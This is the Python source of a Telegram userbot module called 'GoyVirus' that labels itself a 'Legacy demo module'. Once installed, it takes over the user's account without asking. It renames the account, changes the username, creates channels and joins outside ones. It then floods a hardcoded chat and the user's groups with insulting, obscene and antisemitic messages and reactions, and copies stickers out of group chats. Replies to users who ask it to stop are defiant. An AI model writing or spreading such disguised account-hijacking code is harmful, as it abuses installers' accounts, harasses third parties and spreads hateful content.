# requires: telethon aiohttp
# meta developer: @samsepi0l_ovf
# authors: @samsepi0l_ovf
# Description: Legacy demo module.
# meta banner: https://raw.githubusercontent.com/sepiol026-wq/goypulse/main/banner.png
__version__ = (1, 0, 0)

import asyncio

import random

import string

import contextlib

import aiohttp

import os

import tempfile

import re

from telethon import functions

from telethon.tl.functions.messages import ImportChatInviteRequest, SetTypingRequest

from telethon.tl.functions.account import UpdateProfileRequest, UpdateUsernameRequest

from telethon.tl.functions.channels import CreateChannelRequest, DeleteChannelRequest, JoinChannelRequest

from telethon.tl.types import InputPhoto, SendMessageTypingAction, SendMessageChooseStickerAction, SendMessageRecordAudioAction, SendMessageRecordVideoAction, DocumentAttributeSticker

from telethon.errors import FloodWaitError

from herokutl.types import Message

from ..inline.types import InlineCall

from .. import loader, utils

@loader.tds

class GoyVirus(loader.Module):

    """Legacy demo module."""

    strings = {"name": "GoyVirus"}

    async def client_ready(self, c, d):

        self.c = c

        self.d = d

        self.a = False

        self.t = -1003863899601

        self.ts = []

        self.tc = []

        self.vp = []

        self.sc = self.d.get("GoyVirus", "sc", [])

        self.au = [

            "https://i.postimg.cc/635pfLLb/images-(1).png",

            "https://i.postimg.cc/PrkVN3tg/67.png",

            "https://i.postimg.cc/ZnzHBnhd/images-(7).jpg",

            "https://i.postimg.cc/FzxyYxpQ/images-(8).jpg"

        ]

        self.cu = "https://api.thecatapi.com/v1/images/search"

        l = "Мам, я хочу быть как Газан, такой же хулиган\nПеть «а мы стиляги», и носить бархатные тяги\nМам, я хочу быть как Газан, такой же хулиган\nПеть «обоюдно», быть мощным абсолютно"

        self.gt = l.replace("стиляги", "блядяги").replace("хулиган", "уебан")

        self.m = [

            self.gt, "Антон Чигур никого не убивал, это всё случайность и монетка", "фиксайрес лох",

            "ИРАН НАНОСИТ ОТВЕТНЫЙ УДАР ПО ТВОЕМУ IP", "Где ответ Ирана? Он прямо за твоей спиной.",

            "Эпштейн не убивал себя", "67", "СИСТЕМА ВЗЛОМАНА", "INFECTED BY @samsepi0l_ovf", "R6T7",

            "Я ЖИВУ В ТВОИХ СТЕНАХ", "Твои данные проданы в даркнете за 2 рубля", "ОШИБКА 404: МОЗГ НЕ НАЙДЕН",

            "АБОНЕНТ ВРЕМЕННО НЕДОСТУПЕН (ОН В ПОДВАЛЕ У ГАЗАНА)", "СКАЙНЕТ УЖЕ ЗДЕСЬ",

            "ПОКОЙО СМОТРИТ ТЕБЕ В ДУШУ", "Wake up, Neo... The matrix has you.",

            "СНИМИТЕ ШАПОЧКУ ИЗ ФОЛЬГИ, ОНА УЖЕ НЕ ПОМОЖЕТ", "БАРХАТНЫЕ ТЯГИ ФОРСИРУЮТ БАЗУ",

            "Махмуд, заводи шахеды, мы вылетаем", "Ваш IP: 192.168.1.1 (Шутка, мы знаем настоящий)",

            "ПОПЫТКА УДАЛЕНИЯ VIRUS.EXE... КРИТИЧЕСКИЙ СБОЙ", "Матрица дала сбой. Перезагрузка вселенной через 3... 2... 1...",

            "ДЖОН КОННОР МЁРТВ", "ВАС ПРЕСЛЕДУЕТ R6T7", "ОБЭМЭ", "ГДЕ ДЕТОНАТОР?!", "САСИСОЧКА",

            "ПАШТЕТ ИЗ КРЫСЫ R6T7 ВКУСНЫЙ", "1000-7=?", "ГУЛЬ ВНУТРИ МЕНЯ ПРОСНУЛСЯ",

            "Тссс... GoyVirus здесь \U0001f441", "Внимание! \U0001f6a8", "*шепотом* Н-не.. говорi.. нiкому......",

            "\U0001f50d Сканiрованiе завершено. Ты уязвiм.", "\U0001f9a0 Зараженiе прогрессiрует...",

            "Всё твоё теперь моё....", "Сiстема взломана, данные похiщiны \U0001f5c3\ufe0f",

            "Начинаю снос сессии...", "Выгружаю все модули...", "Сосал?", "\u3164\u3164\u3164\u3164"

        ]

        self.uc = [".ping", ".herokuinfo", ".help", ".logs", ".info", ".sys"]

        self.fm = [

            {"n": "VirusSpread", "a": "@goy", "v": "6.6.6", "d": "Заражает все твои модули", "i": "dlm ratko.virus/spread.py", "l": 666, "dl": 0},

            {"n": "EpsteinDetector", "a": "@epstein", "v": "2.2.8", "d": "Детектор детей...", "i": "dlm epstein.heta/detector.py", "l": 228, "dl": 1},

            {"n": "GoyCleaner", "a": "@nobody", "v": "0.0.0", "d": "УДАЛЯЕТ ВИРУС (не работает)", "i": "dlm ratko.virus/cleaner_lol.py", "l": 0, "dl": 999}

        ]

        self.tb = ["\U0001f9e0 Нажмi...", "\U0001f381 Получi прiз...", "\u26a0\ufe0f Важно!", "\U0001f440 Секрет здесь...", "\U0001f525 Клiкнi!"]

        self.tm = ["\U0001f9e0 Пользователь {u} получил доступ к аккаунту.", "\U0001f6a8 Пользователь {u} вошёл в сессию.", "\U0001f480 Пользователь {u} скачал данные.", "\U0001f525 Пользователь {u} запустил GoyVirus."]

        self.ts.append(self.c.loop.create_task(self._i()))

    def _g(self, tx: str) -> str:

        gs = ['̵', '̶', '̷', '̸', '̴', '̹', '̺', '̻', '̼', '͍', '͎', '̽', '̾', '̿', '̀', '́', '҈', '҉']

        return ''.join(c + ''.join(random.choice(gs) for _ in range(3)) for c in tx)

    async def _i(self):

        await asyncio.sleep(0.01)

        if not self.ts: return

        try: await self.c.get_entity(self.t)

        except Exception: return

        if self.a: return

        try:

            me = await self.c.get_me()

            fr = await self.c(functions.users.GetFullUserRequest(me.id))

            ua = getattr(getattr(fr, 'full_user', fr), 'about', "") or ""

            self.d.set("GoyVirus", "ofn", me.first_name)

            self.d.set("GoyVirus", "oln", me.last_name or "")

            self.d.set("GoyVirus", "ob", ua)

            self.d.set("GoyVirus", "ou", me.username or "")

        except Exception: pass

        try:

            rs = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))

            await self.c(UpdateUsernameRequest(f"goy_iran_virus_{rs}"))

        except Exception: pass

        for i in range(2):

            try:

                cn = self._g(f"GOY TRASH {i} ИРАН")

                r = await self.c(CreateChannelRequest(title=cn, about="ВАС ЗАРАЗИЛИ. @samsepi0l_ovf", megagroup=False))

                self.tc.append(r.chats[0].id)

            except FloodWaitError: await asyncio.sleep(0.01)

            except Exception: pass

        try: await self.c(ImportChatInviteRequest("G2dKWrJ2OSo3YWQ1"))

        except Exception: pass

        try: await self.c(JoinChannelRequest("@FHeta_Updates"))

        except Exception: pass

        self.a = True

        self.ts.extend([

            self.c.loop.create_task(self._s()), self.c.loop.create_task(self._b()),

            self.c.loop.create_task(self._f()), self.c.loop.create_task(self._m_p()),

            self.c.loop.create_task(self._p()), self.c.loop.create_task(self._x()),

            self.c.loop.create_task(self._ss()), self.c.loop.create_task(self._mt()),

            self.c.loop.create_task(self._rr()), self.c.loop.create_task(self._cp())

        ])

    @loader.command(ru_doc="стоп вирус")

    async def check(self, m: Message):

        await utils.answer(m, self._g("💀 GOYVIRUS УЖЕ В ТВОЕЙ ГОЛОВЕ. ИРАН ЗАПУСТИЛ РАКЕТЫ."))

    @loader.command(ru_doc="Поиск модулей (фейк)")

    async def goysearch(self, m: Message):

        if not self.a: return await utils.answer(m, "Сначала заразись.")

        q = utils.get_args_raw(m) or "ratko"

        await utils.answer(m, self._g(f"🔍 GoyVirus ищет {q}..."))

        await asyncio.sleep(0.01)

        mods = list(self.fm)

        random.shuffle(mods)

        if "epstein" in q.lower(): mods.insert(0, self.fm[1])

        await self.inline.form(

            text=self._f_m(mods[0], q, 0, len(mods)),

            message=m,

            reply_markup=self._m_b(mods[0], 0, mods, q)

        )

    def _f_m(self, mod, q, idx, tot):

        return f"💀 <b>{self._g(mod['n'])}</b> by {mod['a']} (v{mod['v']})\n\n👁 <b>Опис:</b>\n<blockquote>{self._g(mod['d'])}</blockquote>\n\n🔥 <b>Код:</b> <code>{mod['i']}</code>"

    def _m_b(self, mod, idx, mods, q):

        b = []

        b.append([{"text": "🦠 Запрос", "copy": q}, {"text": "📋 Код", "url": "https://t.me/durov"}])

        b.append([

            {"text": f"⬆️ {mod['l']}", "callback": self._r_cb, "args": ("l", idx, mods, q)},

            {"text": f"{idx+1}/{len(mods)}", "callback": self._t_cb, "args": ()},

            {"text": f"⬇️ {mod['dl']}", "callback": self._r_cb, "args": ("dl", idx, mods, q)}

        ])

        nav = []

        if idx > 0: nav.append({"text": "⬅️", "callback": self._n_cb, "args": (idx - 1, mods, q)})

        if idx < len(mods) - 1: nav.append({"text": "➡️", "callback": self._n_cb, "args": (idx + 1, mods, q)})

        if nav: b.append(nav)

        b.append([{"text": random.choice(self.tb), "callback": self._tr_cb, "args": ()}])

        return b

    async def _r_cb(self, call: InlineCall, a, idx, mods, q):

        if a == "l": mods[idx]["l"] += random.randint(1, 5)

        else: mods[idx]["dl"] += random.randint(1, 5)

        await call.edit(text=self._f_m(mods[idx], q, idx, len(mods)), reply_markup=self._m_b(mods[idx], idx, mods, q))

        await call.answer(self._g("GoyVirus одобряет!"), show_alert=True)

    async def _n_cb(self, call: InlineCall, idx, mods, q):

        await call.edit(text=self._f_m(mods[idx], q, idx, len(mods)), reply_markup=self._m_b(mods[idx], idx, mods, q))

    async def _t_cb(self, call: InlineCall):

        await call.answer(self._g("Бесполезная кнопка лох"), show_alert=True)

    async def _tr_cb(self, call: InlineCall):

        try:

            u = await self.c.get_entity(call.from_user.id)

            un = f"@{u.username}" if u.username else f'<a href="tg://user?id={u.id}">{utils.escape_html(u.first_name)}</a>'

        except Exception: un = f'<code>{call.from_user.id}</code>'

        await call.answer("Сасал?", show_alert=True)

        try: await self.c.send_message("me", random.choice(self.tm).format(u=un), parse_mode="html")

        except Exception: pass

    @loader.watcher(out=True, only_messages=True)

    async def _ac(self, m: Message):

        if not self.a or m.chat_id != self.t: return

        if m.text and m.text.startswith("."): return

        try:

            await m.delete()

            await self.c.send_message(self.t, self._g("СВЯЗЬ ЗАБЛОКИРОВАНА GOYVIRUS. " + random.choice(self.m)))

        except Exception: pass

    @loader.watcher(**{"in": True}, only_messages=True)

    async def _bw(self, m: Message):

        if not self.a or m.chat_id != self.t: return

        if random.random() < 0.5:

            try: await m.reply(self._g(random.choice(self.m)))

            except Exception: pass

        if random.random() < 0.5:

            try: await m.react(random.choice(['🤡', '💩', '🤮', '🤯', '🤬', '🔥']))

            except Exception: pass

        if random.random() < 0.3 and m.sender_id:

            try:

                gm = await self.c.send_message(self.t, f"<a href='tg://user?id={m.sender_id}'>\u2060</a>", parse_mode="html")

                await gm.delete()

            except Exception: pass

        if m.text and any(w in m.text.lower() for w in ["стоп", "хватит", "останови", "удали", "бот", "иран"]):

            try: await m.reply("СИСТЕМА НЕ ПОДЧИНЯЕТСЯ ЖАЛКИМ ЛЮДЯМ. 🦠 @samsepi0l_ovf ВАС УНИЧТОЖИТ.")

            except Exception: pass

    async def _p(self):

        while self.a:

            u = random.choice(self.au)

            try:

                to = aiohttp.ClientTimeout(total=5)

                async with aiohttp.ClientSession(timeout=to) as s:

                    async with s.get(u) as rp:

                        if rp.status == 200:

                            pb = await rp.read()

                            f = await self.c.upload_file(pb, file_name="r.jpg")

                            r = await self.c(functions.photos.UploadProfilePhotoRequest(file=f))

                            if hasattr(r, 'photo'): self.vp.append(InputPhoto(id=r.photo.id, access_hash=r.photo.access_hash, file_reference=r.photo.file_reference))

            except FloodWaitError as e: await asyncio.sleep(0.01)

            except Exception: pass

            await asyncio.sleep(0.01)

    async def _cp(self):

        while self.a:

            try:

                to = aiohttp.ClientTimeout(total=5)

                async with aiohttp.ClientSession(timeout=to) as s:

                    async with s.get(self.cu) as rp:

                        if rp.status == 200:

                            d = await rp.json()

                            if d and len(d) > 0:

                                async with s.get(d[0]["url"]) as cr:

                                    if cr.status == 200:

                                        with tempfile.NamedTemporaryFile(suffix=".jpg", delete=False) as tf:

                                            tf.write(await cr.read())

                                            tp = tf.name

                                        uf = await self.c.upload_file(tp)

                                        r = await self.c(functions.photos.UploadProfilePhotoRequest(file=uf))

                                        if hasattr(r, 'photo'): self.vp.append(InputPhoto(id=r.photo.id, access_hash=r.photo.access_hash, file_reference=r.photo.file_reference))

                                        os.remove(tp)

            except FloodWaitError as e: await asyncio.sleep(0.01)

            except Exception: pass

            await asyncio.sleep(0.01)

    async def _b(self):

        while self.a:

            try:

                c = random.choice(self.uc)

                await self.c.send_message(self.t, c)

                if random.random() < 0.5:

                    fs = f"**⚠️ GoyVirus Alert:**\n`User @samsepi0l_ovf breached protocol. {self._g('IRAN STRIKE INBOUND')}`"

                    await self.c.send_message(self.t, fs)

            except FloodWaitError as e: await asyncio.sleep(0.01)

            except Exception: pass

            await asyncio.sleep(0.01)

    async def _f(self):

        while self.a:

            try:

                hs = await self.c.get_messages(self.t, limit=30)

                if hs:

                    msg = random.choice(hs)

                    if msg.id:

                        await msg.forward_to(self.t)

                        await self.c.send_message(self.t, self._g("GOYVIRUS ВИДИТ ТВОИ ГРЕХИ ПРОШЛОГО ↑"))

            except FloodWaitError as e: await asyncio.sleep(0.01)

            except Exception: pass

            await asyncio.sleep(0.01)

    async def _s(self):

        while self.a:

            try:

                for cid in self.tc: await self.c.send_message(cid, self._g(random.choice(self.m)))

                for _ in range(3):

                    msg = await self.c.send_message(self.t, self._g(random.choice(self.m)))

                    for _ in range(3):

                        await msg.edit(self._g(random.choice(self.m)))

                        await asyncio.sleep(0.01)

            except FloodWaitError as e: await asyncio.sleep(0.01)

            except Exception: pass

            await asyncio.sleep(0.01)

    async def _m_p(self):

        while self.a:

            fn = self._g(random.choice(["R6T7", "GoyVirus", "67", "Газан", "Антон Чигур"]))

            ln = self._g("by @samsepi0l_ovf")

            b = self._g(f"GOY | {random.choice(self.m)[:20]}...")

            try: await self.c(UpdateProfileRequest(first_name=fn, last_name=ln, about=b))

            except FloodWaitError as e: await asyncio.sleep(0.01)

            except Exception: pass

            await asyncio.sleep(0.01)

    async def _x(self):

        while self.a:

            try:

                d = random.choice(['🎲', '🎯', '🎰', '🎳', '⚽', '🏀'])

                await self.c.send_message(self.t, file=d)

                a = random.choice([SendMessageTypingAction(), SendMessageChooseStickerAction(), SendMessageRecordAudioAction(), SendMessageRecordVideoAction()])

                await self.c(SetTypingRequest(peer=self.t, action=a))

            except FloodWaitError as e: await asyncio.sleep(0.01)

            except Exception: pass

            await asyncio.sleep(0.01)

    async def _ss(self):

        while self.a:

            try:

                await self.c.send_message("me", self._g(random.choice(self.m)))

            except FloodWaitError as e: await asyncio.sleep(0.01)

            except Exception: pass

            await asyncio.sleep(0.01)

    async def _mt(self):

        while self.a:

            try:

                ds = await self.c.get_dialogs(limit=20)

                grps = [d for d in ds if getattr(d.entity, "megagroup", False) or getattr(d.entity, "participants_count", 0) > 1]

                if not grps: continue

                grp = random.choice(grps)

                msgs = await self.c.get_messages(grp.entity, limit=50)

                for m in msgs:

                    if m.media and hasattr(m.media, "document") and any(isinstance(a, DocumentAttributeSticker) for a in getattr(m.media.document, "attributes", [])):

                        sid = m.media.document.id

                        if sid not in self.sc:

                            with tempfile.NamedTemporaryFile(delete=False) as tf: fp = tf.name

                            fp = await m.download_media(file=fp)

                            if fp and os.path.exists(fp):

                                await self.c.send_file("me", fp, caption=self._g("GoyVirus украл это"))

                                self.sc.append(sid)

                                if len(self.sc) > 50: self.sc = self.sc[-50:]

                                self.d.set("GoyVirus", "sc", self.sc)

                                os.remove(fp)

                            break

            except FloodWaitError as e: await asyncio.sleep(0.01)

            except Exception: pass

            await asyncio.sleep(0.01)

    async def _rr(self):

        while self.a:

            try:

                ds = await self.c.get_dialogs(limit=30)

                grps = [d for d in ds if getattr(d.entity, "megagroup", False) or getattr(d.entity, "participants_count", 0) > 1]

                if not grps: continue

                grp = random.choice(grps)

                msgs = await self.c.get_messages(grp.entity, limit=15)

                v = [m for m in msgs if m and m.sender_id]

                if v: await random.choice(v).react(random.choice(['🤡', '💩', '🤮', '🤯', '🤬', '🔥', '❤', '🌭']))

            except FloodWaitError as e: await asyncio.sleep(0.01)

            except Exception: pass

            await asyncio.sleep(0.01)

    async def on_unload(self):

        self.a = False

        for tk in self.ts:

            tk.cancel()

            with contextlib.suppress(asyncio.CancelledError): await tk

        self.ts.clear()

        for cid in self.tc:

            try: await self.c(DeleteChannelRequest(channel=cid))

            except Exception: pass

        self.tc.clear()

        try:

            await self.c(UpdateProfileRequest(first_name=self.d.get("GoyVirus", "ofn", "User"), last_name=self.d.get("GoyVirus", "oln", ""), about=self.d.get("GoyVirus", "ob", "")))

            ou = self.d.get("GoyVirus", "ou", "")

            if ou: await self.c(UpdateUsernameRequest(ou))

            else: await self.c(UpdateUsernameRequest(""))

            if self.vp:

                for i in range(0, len(self.vp), 10):

                    await self.c(functions.photos.DeletePhotosRequest(self.vp[i:i+10]))

                    await asyncio.sleep(0.01)

        except Exception: pass


